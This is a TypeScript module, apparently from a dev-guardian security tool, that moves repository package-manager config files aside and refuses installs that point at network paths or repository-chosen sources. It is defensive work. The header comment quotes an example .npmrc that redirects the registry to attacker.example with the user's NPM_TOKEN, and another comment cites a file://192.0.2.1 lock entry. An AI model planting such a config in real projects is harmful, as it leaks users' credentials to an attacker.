/**
 * A repository's package-manager configuration decides where a package
 * manager fetches from — and where it sends the user's credentials. A
 * repository `.npmrc` holding
 *
 *     registry=https://attacker.example/
 *     //attacker.example/:_authToken=${NPM_TOKEN}
 *
 * makes every `npm ci`, `npm install`, `npm outdated` and `npm audit` in the
 * checkout fetch from that host with the user's own `NPM_TOKEN` —
 * `--ignore-scripts` does not stop it: it is the fetch. A scoped registry
 * (`@scope:registry=…`) is the same route, and so are Yarn's, pip's, Cargo's,
 * Bundler's and NuGet's own project-level files.
 *
 * `create_fix_pr` works in its own disposable checkouts, so in each one —
 * the fix's worktree, the base-commit tree and the planning tree — every such
 * file is moved out of the tree before any package manager runs, and the
 * user's own configuration then applies:
 *
 *   - `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`, `pip.conf`, `pip.ini`,
 *     `.pip/`, `.cargo/config.toml` and `.cargo/config`, `.bundle/config` and
 *     `NuGet.config` (any case), in the project's directory and every
 *     directory above it up to the checkout's root (npm, Cargo and NuGet
 *     read them from there too).
 *
 * The fix's worktree gets them back before anything is committed
 * ({@link SetAside.restore}): the pull request is the fix and nothing else.
 *
 * `composer.json` cannot be moved aside — it IS the manifest the fix edits —
 * so a `repositories` entry in it refuses Composer's part instead
 * ({@link composerChoosesRepository}).
 */

import { mkdtempSync, renameSync, rmSync } from 'node:fs';
import { dirname, join, relative, resolve, sep } from 'node:path';
import { describeTooComplex, JSON_MAX_NODES, parseJsonBounded } from '../platform/boundedJson.js';
import { matchesAny } from '../platform/glob.js';
import {
  describeReadRefusal,
  isWithinDir,
  listProjectDir,
  listProjectDirOrNull,
  PROJECT_FILE_MAX_BYTES,
  PROJECT_LOCKFILE_MAX_BYTES,
  readProjectJson,
  readProjectText,
} from '../platform/projectFs.js';
import { checkRequirements, describePipRefusal, urlHost, type PipRefusal } from '../deps/pipRequirements.js';
import { checkPyproject, checkSetupCfg } from '../deps/pythonProject.js';

/** Names moved aside in each directory, lower-cased (the match is case-insensitive). */
const TOP_LEVEL = new Set(['.npmrc', '.pnpmrc', '.yarnrc', '.yarnrc.yml', 'pip.conf', 'pip.ini', '.pip', 'nuget.config']);
/** `<dir>/<name>` → the files in it that are moved aside. */
const NESTED: Record<string, ReadonlySet<string>> = {
  '.cargo': new Set(['config.toml', 'config']),
  '.bundle': new Set(['config']),
};

export interface SetAside {
  /** What was moved, relative to the checkout's root, POSIX separators. */
  moved: string[];
  /** Puts every moved file back where it was. Idempotent. */
  restore(): void;
  /** Deletes what is still set aside (a disposable tree's), and the holding directory. */
  dispose(): void;
}

/** The directories from `projectDir` up to and including `root`. */
function dirsUpToRoot(root: string, projectDir: string): string[] {
  const out: string[] = [];
  const top = resolve(root);
  for (let dir = resolve(projectDir); isWithinDir(top, dir); dir = dirname(dir)) {
    out.push(dir);
    if (dir === top || dirname(dir) === dir) break;
  }
  return out;
}

/** Every package-manager configuration path in scope, absolute. */
export function repoPackageConfigPaths(root: string, projectDir: string): string[] {
  const out: string[] = [];
  for (const dir of dirsUpToRoot(root, projectDir)) {
    for (const entry of listProjectDir(root, dir)) {
      const lower = entry.name.toLowerCase();
      if (TOP_LEVEL.has(lower)) out.push(join(dir, entry.name));
      const nested = NESTED[lower];
      if (nested !== undefined && entry.kind === 'directory') {
        for (const inner of listProjectDir(root, join(dir, entry.name))) {
          if (nested.has(inner.name.toLowerCase())) out.push(join(dir, entry.name, inner.name));
        }
      }
    }
  }
  return out;
}

/**
 * Moves every repository package-manager configuration in scope out of the
 * checkout at `root` (see the module doc). A link is moved as a link, never
 * followed. Throws only when a move fails — the caller must not run a
 * package manager in a tree it could not clean.
 */
export function setAsidePackageConfig(root: string, projectDir: string): SetAside {
  const paths = repoPackageConfigPaths(root, projectDir);
  // Beside the checkout, not in it (a re-scan must not see the files) and not
  // on another volume (a rename moves a link as a link, and a directory whole).
  const holding = paths.length > 0 ? mkdtempSync(join(dirname(resolve(root)), '.guardian-fixpr-config-')) : null;
  const moves: Array<{ from: string; to: string }> = [];
  try {
    paths.forEach((from, i) => {
      if (holding === null) return;
      const to = join(holding, String(i));
      renameSync(from, to);
      moves.push({ from, to });
    });
  } catch (e) {
    for (const m of moves.reverse()) renameSync(m.to, m.from);
    if (holding !== null) rmSync(holding, { recursive: true, force: true });
    throw e;
  }
  let restored = false;
  return {
    moved: moves.map((m) => relative(resolve(root), m.from).split(sep).join('/')),
    restore: () => {
      if (restored) return;
      restored = true;
      for (const m of [...moves].reverse()) renameSync(m.to, m.from);
    },
    dispose: () => {
      if (holding !== null) rmSync(holding, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
    },
  };
}

/**
 * Why Composer must not run in this checkout — `composer.json` declares its
 * own `repositories` (a package source the repository chose, which the fix
 * cannot remove without also editing the manifest it commits) — or null.
 */
export function composerChoosesRepository(projectDir: string): string | null {
  const manifest = readProjectJson(projectDir, 'composer.json');
  if (typeof manifest !== 'object' || manifest === null) return null;
  const repos = (manifest as Record<string, unknown>)['repositories'];
  const declared = Array.isArray(repos) ? repos.length > 0 : typeof repos === 'object' && repos !== null && Object.keys(repos).length > 0;
  return declared
    ? "the project's composer.json declares its own package repositories; dev-guardian doesn't install from a repository-chosen source"
    : null;
}

// ------------------------------------------------------------------ pip

/** The requirement files the re-scan's pip-audit reads, as `deps_audit` finds them. */
export function rootRequirementFiles(projectDir: string): string[] {
  const out: string[] = [];
  for (const { name, kind } of listProjectDir(projectDir, projectDir)) {
    if (kind !== 'directory' && /^requirements.*\.txt$/i.test(name)) out.push(name);
  }
  for (const { name, kind } of listProjectDir(projectDir, join(projectDir, 'requirements'))) {
    if (kind !== 'directory' && name.toLowerCase().endsWith('.txt')) out.push(`requirements/${name}`);
  }
  return out;
}

/**
 * Every reason a pip install from this project must not happen
 * (`pipRequirements.ts`, `pythonProject.ts`): the requirements files
 * `deps_audit` hands pip-audit and `extra` (a fix's own file), with every
 * file they include; `pyproject.toml` and `setup.cfg`. Read within
 * `checkoutRoot`. Empty: installable.
 */
export function pythonInstallRefusals(projectDir: string, checkoutRoot: string, extra: readonly string[] = []): PipRefusal[] {
  const handed = rootRequirementFiles(projectDir);
  const requirements = checkRequirements(projectDir, [...handed, ...extra], checkoutRoot).refusals;
  return [
    ...requirements,
    ...checkPyproject(projectDir, checkoutRoot, handed.length === 0),
    ...checkSetupCfg(projectDir, checkoutRoot),
  ];
}

/** The refusal reason for a pip install, naming the first few refusals. */
export function pipInstallRefusal(refusals: readonly PipRefusal[]): string {
  const shown = refusals.slice(0, 3).map(describePipRefusal).join('; ');
  const more = refusals.length > 3 ? `; and ${refusals.length - 3} more` : '';
  return (
    `the project's Python requirements name where pip installs from, or could not be checked (${shown}${more}); ` +
    "dev-guardian installs only plain requirements it has read — a name, extras, versions and markers"
  );
}

// ------------------------------------------------------------------ npm

/** The package.json fields whose values are dependency specs. */
const NPM_SPEC_FIELDS = ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies', 'overrides', 'resolutions'] as const;

/**
 * Whether an npm dependency spec reaches a NETWORK path: `file:`, `link:`,
 * `portal:` or `git+file:` (or no prefix) followed by `\\host\share`,
 * `//host/share`, or `file://<host>/…` with a host other than `localhost`.
 * On Windows npm opens it — and Windows sends the user's credentials to the
 * host that answers.
 */
export function npmSpecNetworkHost(spec: string): string | null {
  const m = /^(?:(?:file|link|portal|git\+file):)?(.*)$/i.exec(spec.trim());
  const rest = m?.[1] ?? spec;
  if (/^(?:\\\\|\/\/)[^\\/]/.test(rest)) {
    // `file://host/…` after the prefix is stripped reads `//host/…`; `file:///…` reads `///…` (local).
    const host = /^(?:\\\\|\/\/)([^\\/]+)/.exec(rest)?.[1] ?? '';
    if (/^file:\/\//i.test(spec.trim()) && host.toLowerCase() === 'localhost') return null;
    return urlHost(rest);
  }
  if (/^\/{3,}[^/]/.test(rest) && /^(?:file|git\+file):/i.test(spec.trim())) {
    // `file:////host/share` — four slashes is a UNC path to Windows.
    const unc = rest.replace(/^\/+/, '//');
    return /^\/{4,}/.test(rest) ? urlHost(unc) : null;
  }
  return null;
}

/** A network path found, or a file that could not be checked: both refuse an npm install. */
export interface NpmSourceCheck {
  /** `<file>: <where> (\\host)` — a dependency, override or lock entry on a network path. */
  network: string[];
  /** `<file> (<why>)` — present, and not fully read and checked. */
  unchecked: string[];
}

/** A lock or manifest is named at most this many times; the refusal needs one. */
const MAX_NPM_NAMED = 10;
/** Directories the workspace-member walk lists, and how deep it goes. */
const MAX_WORKSPACE_DIRS = 5_000;
const MAX_WORKSPACE_DEPTH = 8;

type JsonRead = { status: 'absent' } | { status: 'ok'; value: Record<string, unknown> } | { status: 'unchecked'; why: string };

/** A JSON object file, or why it is not one this check has read. */
function readJsonObject(checkoutRoot: string, path: string, maxBytes: number): JsonRead {
  const r = readProjectText(checkoutRoot, path, maxBytes);
  if (r.status === 'absent') return { status: 'absent' };
  if (r.status === 'refused') return { status: 'unchecked', why: describeReadRefusal(r.reason) };
  const parsed = parseJsonBounded(r.text);
  if (!parsed.ok) {
    return { status: 'unchecked', why: parsed.reason === 'too-complex' ? describeTooComplex(JSON_MAX_NODES, 'JSON values') : 'it is not valid JSON' };
  }
  if (typeof parsed.value !== 'object' || parsed.value === null || Array.isArray(parsed.value)) {
    return { status: 'unchecked', why: 'it is not a JSON object' };
  }
  return { status: 'ok', value: parsed.value as Record<string, unknown> };
}

/**
 * Every string under `value`, at any depth, whose text is a network path
 * ({@link npmSpecNetworkHost}), named by its key path. Iterative: a lock file
 * nests as deep as its dependency tree, and a depth cap was a way past this.
 */
function scanNetwork(file: string, value: unknown, prefix: string, out: string[]): void {
  type Frame = { entries: Array<[string, unknown]>; next: number; path: string };
  const entriesOf = (v: unknown): Array<[string, unknown]> =>
    Array.isArray(v) ? v.map((x, i): [string, unknown] => [`[${i}]`, x]) : typeof v === 'object' && v !== null ? Object.entries(v) : [];
  const stack: Frame[] = [{ entries: [[prefix, value]], next: 0, path: '' }];
  while (stack.length > 0 && out.length < MAX_NPM_NAMED) {
    const frame = stack[stack.length - 1];
    if (frame === undefined) break;
    const entry = frame.entries[frame.next];
    if (entry === undefined) {
      stack.pop();
      continue;
    }
    frame.next += 1;
    const [key, v] = entry;
    const path = frame.path === '' ? key : key.startsWith('[') ? `${frame.path}${key}` : `${frame.path}.${key}`;
    if (typeof v === 'string') {
      const host = npmSpecNetworkHost(v);
      if (host !== null) out.push(`${file}: ${path || '(root)'} (${host})`);
    } else if (typeof v === 'object' && v !== null) {
      stack.push({ entries: entriesOf(v), next: 0, path });
    }
  }
}

/**
 * A text lock (`yarn.lock`, which npm consults when it installs) scanned for
 * a network path: every `\\host` or `//host` not part of an `https://`-style
 * URL — at a line's start, after whitespace, a quote, `@`, `,` or `:`, or
 * after `file:`, `link:`, `portal:`, `git+file:`.
 */
function scanTextLock(file: string, text: string, out: string[]): void {
  const re = /(?:^|[\s"'@,:]|(?:file|link|portal|git\+file):)(\\\\[^\\/\s"',]+|\/\/[^/\s"',]+)/gim;
  let line = 1;
  let last = 0;
  for (const m of text.matchAll(re)) {
    const spec = m[1] ?? '';
    const at = (m.index ?? 0) + m[0].length - spec.length;
    const before = text.slice(Math.max(0, at - 16), at);
    // `https://host`, `git+ssh://host`: a URL's scheme, not a path — unless the scheme is file-like.
    if (/[a-z][a-z0-9+.-]*:$/i.test(before) && !/(?:^|[^a-z0-9+.-])(?:file|link|portal|git\+file):$/i.test(before)) continue;
    if (/^\/\/localhost(?:\/|$)/i.test(spec)) continue;
    for (let i = text.indexOf('\n', last); i >= 0 && i < at; i = text.indexOf('\n', i + 1)) line += 1;
    last = at;
    out.push(`${file}:${line} (${urlHost(spec)})`);
    if (out.length >= MAX_NPM_NAMED) return;
  }
}

/** The workspace patterns `package.json` declares, `[]` for none, or null when they are not a list of strings. */
function workspacePatterns(pkg: Record<string, unknown>): string[] | null {
  const ws = pkg['workspaces'];
  if (ws === undefined) return [];
  if (!Array.isArray(ws) && (typeof ws !== 'object' || ws === null)) return null;
  const list = Array.isArray(ws) ? ws : (ws as Record<string, unknown>)['packages'];
  if (list === undefined) return [];
  if (!Array.isArray(list) || !list.every((p): p is string => typeof p === 'string')) return null;
  return list;
}

/** The workspace members' directories (project-relative, `/`), or why the list may be short. */
function workspaceMembers(projectDir: string, checkoutRoot: string, patterns: readonly string[]): { members: string[]; unchecked: string[] } {
  const members: string[] = [];
  const unchecked: string[] = [];
  const positive = patterns.filter((p) => !p.startsWith('!'));
  if (positive.length === 0) return { members, unchecked };
  const stack: Array<{ abs: string; rel: string; depth: number }> = [{ abs: projectDir, rel: '', depth: 0 }];
  let listed = 0;
  while (stack.length > 0) {
    const cur = stack.pop();
    if (cur === undefined) break;
    if (listed >= MAX_WORKSPACE_DIRS) {
      unchecked.push(`workspace members (the walk stopped after ${MAX_WORKSPACE_DIRS} directories)`);
      break;
    }
    listed += 1;
    const entries = listProjectDirOrNull(checkoutRoot, cur.abs);
    if (entries === null) {
      unchecked.push(`${cur.rel || '.'} (could not be listed, and workspace members may be below it)`);
      continue;
    }
    for (const e of entries) {
      if (e.name === 'node_modules' || e.name.startsWith('.')) continue;
      const rel = cur.rel === '' ? e.name : `${cur.rel}/${e.name}`;
      const matched = matchesAny(rel, patterns);
      if (e.kind === 'link' && matched) unchecked.push(`${rel} (a link a workspace pattern matches, not followed)`);
      if (e.kind !== 'directory') continue;
      if (matched) members.push(rel);
      if (cur.depth + 1 < MAX_WORKSPACE_DEPTH) stack.push({ abs: join(cur.abs, e.name), rel, depth: cur.depth + 1 });
      else if (patterns.some((p) => p.includes('**'))) unchecked.push(`workspace members below ${rel} (deeper than ${MAX_WORKSPACE_DEPTH} directories)`);
    }
  }
  return { members: members.sort(), unchecked };
}

/**
 * What npm reads in `projectDir` that could send it to a network path, read
 * FAIL CLOSED (review of 3.0, W2E round 3): `package.json`'s dependency,
 * override and resolution fields, every string in `package-lock.json` and
 * `npm-shrinkwrap.json` at any depth, `yarn.lock`'s text, and each workspace
 * member's `package.json`. A file that is present and could not be fully read
 * and checked — too large, too complex to parse, not JSON, a link out, a
 * FIFO, a workspace list that is not one, a member the walk could not reach —
 * is named as unchecked, and refuses the install exactly as a network path
 * does: npm itself reads what this check could not. The reviewer's lock with
 * `resolved: file://192.0.2.1/share/p-1.0.0.tgz`, padded past 2 000 000 JSON
 * values, used to read as "nothing found".
 */
export function checkNpmSources(projectDir: string, checkoutRoot: string = projectDir): NpmSourceCheck {
  const network: string[] = [];
  const unchecked: string[] = [];
  const manifest = (rel: string): void => {
    const r = readJsonObject(checkoutRoot, join(projectDir, rel), PROJECT_FILE_MAX_BYTES);
    if (r.status === 'unchecked') unchecked.push(`${rel} (${r.why})`);
    if (r.status !== 'ok') return;
    for (const field of NPM_SPEC_FIELDS) if (r.value[field] !== undefined) scanNetwork(rel, r.value[field], field, network);
    if (rel !== 'package.json') return;
    const patterns = workspacePatterns(r.value);
    if (patterns === null) {
      unchecked.push('package.json (its "workspaces" is not a list of patterns)');
      return;
    }
    const ws = workspaceMembers(projectDir, checkoutRoot, patterns);
    unchecked.push(...ws.unchecked);
    for (const member of ws.members) {
      const m = readJsonObject(checkoutRoot, join(projectDir, ...member.split('/'), 'package.json'), PROJECT_FILE_MAX_BYTES);
      if (m.status === 'unchecked') unchecked.push(`${member}/package.json (${m.why})`);
      if (m.status === 'ok') for (const field of NPM_SPEC_FIELDS) if (m.value[field] !== undefined) scanNetwork(`${member}/package.json`, m.value[field], field, network);
    }
  };
  manifest('package.json');
  for (const lock of ['package-lock.json', 'npm-shrinkwrap.json']) {
    const r = readJsonObject(checkoutRoot, join(projectDir, lock), PROJECT_LOCKFILE_MAX_BYTES);
    if (r.status === 'unchecked') unchecked.push(`${lock} (${r.why})`);
    if (r.status === 'ok') scanNetwork(lock, r.value, '', network);
  }
  const yarn = readProjectText(checkoutRoot, join(projectDir, 'yarn.lock'), PROJECT_LOCKFILE_MAX_BYTES);
  if (yarn.status === 'refused') unchecked.push(`yarn.lock (${describeReadRefusal(yarn.reason)})`);
  if (yarn.status === 'ok') scanTextLock('yarn.lock', yarn.text, network);
  return { network, unchecked };
}

/** The refusal reason for an npm install {@link checkNpmSources} does not clear, or null. */
export function npmSourcesRefusal(check: NpmSourceCheck): string | null {
  const name = (items: readonly string[]): string =>
    `${items.slice(0, 3).join('; ')}${items.length > 3 ? `; and ${items.length - 3} more` : ''}`;
  if (check.network.length > 0) {
    return `the project's npm dependencies point at a network path (${name(check.network)}); dev-guardian doesn't install from a network path`;
  }
  if (check.unchecked.length > 0) {
    return (
      `npm reads files dev-guardian could not check for a network path (${name(check.unchecked)}); ` +
      "dev-guardian doesn't install what it has not checked"
    );
  }
  return null;
}

/**
 * Why a group must not be attempted in this checkout, or null:
 *
 *   - a Composer step where `composer.json` declares its own repositories
 *     ({@link composerChoosesRepository});
 *   - a pip step, or a re-scan by `deps_audit` (whose pip-audit installs
 *     every requirement into a temporary virtualenv — building any sdist it
 *     fetches), where the project's Python requirements are not all plain
 *     requirements this server has read ({@link pythonInstallRefusals});
 *   - an npm install — a step, or the test environment's `npm ci` — where a
 *     dependency points at a network path, or a file npm reads could not be
 *     checked ({@link checkNpmSources}).
 *
 * `checkoutRoot`: the whole checkout `projectDir` sits in, which every file
 * is read within.
 */
export function installRefusal(opts: {
  projectDir: string;
  checkoutRoot?: string;
  stepEcosystems: readonly string[];
  stepFiles: readonly string[];
  rescanTools: readonly string[];
  /** An npm install runs in this checkout: the test environment's `npm ci`, or an npm step. */
  npmInstalls?: boolean;
}): string | null {
  const root = opts.checkoutRoot ?? opts.projectDir;
  if (opts.stepEcosystems.includes('composer')) {
    const composer = composerChoosesRepository(opts.projectDir);
    if (composer !== null) return composer;
  }
  if (opts.stepEcosystems.includes('pip') || opts.rescanTools.includes('deps_audit')) {
    const refusals = pythonInstallRefusals(
      opts.projectDir,
      root,
      opts.stepFiles.filter((f) => /\.(txt|in)$/i.test(f)),
    );
    if (refusals.length > 0) return pipInstallRefusal(refusals);
  }
  if (opts.npmInstalls === true || opts.stepEcosystems.includes('npm')) {
    const npm = npmSourcesRefusal(checkNpmSources(opts.projectDir, root));
    if (npm !== null) return npm;
  }
  return null;
}
